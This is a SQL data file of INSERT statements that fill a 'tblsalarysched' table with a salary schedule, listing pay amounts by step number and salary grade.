INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '1', '7575.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '4', '9536.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '18', '25259.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '18', '25671.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '18', '26091.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '18', '26519.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '18', '26956.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '18', '27399.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '18', '27853.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '18', '28315.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '19', '27088.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '19', '27528.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '19', '27977.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '19', '28434.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '19', '28901.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '19', '29375.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '19', '29859.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '19', '30352.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '28', '49320.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '28', '50074.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '28', '50841.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '28', '51623.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '28', '52418.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '28', '53228.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '28', '54053.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '29', '51876.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '29', '52661.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '29', '53460.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '29', '54274.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '29', '55102.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '29', '55945.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '29', '56803.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '29', '57676.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '28', '48579.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '3', '8997.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '3', '9142.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '3', '9292.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '3', '9443.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '3', '9599.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '3', '9756.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '3', '9917.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '4', '9690.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '4', '9848.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '4', '10008.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '4', '10172.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '4', '10339.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '4', '10509.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '4', '10683.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '5', '10271.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '5', '10437.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '5', '10607.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '5', '10780.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '5', '10957.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '5', '11137.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '5', '11320.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '5', '11508.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '6', '11062.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '6', '11242.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '6', '11425.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '6', '11612.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '6', '11803.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '6', '11997.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '6', '12194.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '6', '12397.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '7', '11869.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '7', '12060.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '7', '12257.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '7', '12457.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '7', '12662.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '7', '12870.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '7', '13082.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '7', '13299.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '8', '14267.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '8', '12735.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '8', '12941.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '8', '13151.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '8', '13366.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '8', '13584.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '8', '14035.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '8', '13807.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '9', '13663.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '9', '13884.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '9', '14110.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '9', '14340.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '9', '14575.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '9', '14813.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '9', '15058.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '9', '15305.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '10', '14641.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '10', '14878.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '10', '15118.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '10', '15364.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '10', '15615.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '10', '15872.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '10', '16132.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '10', '16398.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '11', '15649.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '11', '15900.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '11', '16157.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '11', '16419.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '11', '16687.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '11', '16959.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '11', '17237.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '11', '17519.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '12', '16726.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '12', '16995.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '12', '17269.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '12', '17548.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '12', '17833.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '12', '18123.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '12', '18419.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '12', '18720.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '13', '17880.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '13', '18166.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '13', '18457.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '13', '18755.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '13', '19058.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '13', '19367.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '13', '19683.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '13', '20004.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '14', '19112.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '14', '19418.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '14', '19728.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '14', '20045.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '14', '20369.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '14', '20699.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '14', '21034.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '14', '21376.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '15', '20490.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '15', '20827.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '15', '21172.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '15', '21523.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '15', '21882.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '15', '22247.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '15', '22619.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '15', '22999.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '16', '21969.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '16', '22329.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '16', '22697.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '16', '23073.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '16', '23455.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '16', '23845.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '16', '24243.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '16', '24647.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '17', '23555.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '17', '23941.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '17', '24334.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '17', '24734.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '17', '25144.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '17', '25560.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '17', '25984.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '17', '26416.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '20', '29052.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '20', '29522.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '20', '30001.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '20', '30491.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '20', '30988.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '20', '31495.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '20', '32012.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '20', '32539.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '21', '30945.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '21', '31443.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '21', '31949.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '21', '32465.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '21', '32991.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '21', '34630.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '21', '34074.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '21', '33527.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '22', '32973.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '22', '33499.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '22', '34034.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '22', '34580.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '22', '35136.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '22', '35703.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '22', '36280.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '22', '36867.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '23', '35144.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '23', '36268.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '23', '36845.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '23', '37432.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '23', '38032.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '23', '38642.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '23', '39264.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '23', '35701.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '24', '37473.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '24', '38061.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '24', '38661.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '24', '39271.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '24', '39894.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '24', '40526.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '24', '41172.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '24', '41830.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '25', '39966.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '25', '40590.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '25', '41224.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '25', '41870.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '25', '42528.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '25', '43198.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '25', '43880.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '25', '44577.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '26', '43299.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '26', '42639.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '26', '43971.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '26', '44655.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '26', '45352.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '26', '46061.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '26', '46784.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '26', '47520.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '27', '45505.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '27', '46205.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '27', '46917.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '27', '47641.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '27', '48378.00', '1');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '27', '49129.00', '1');
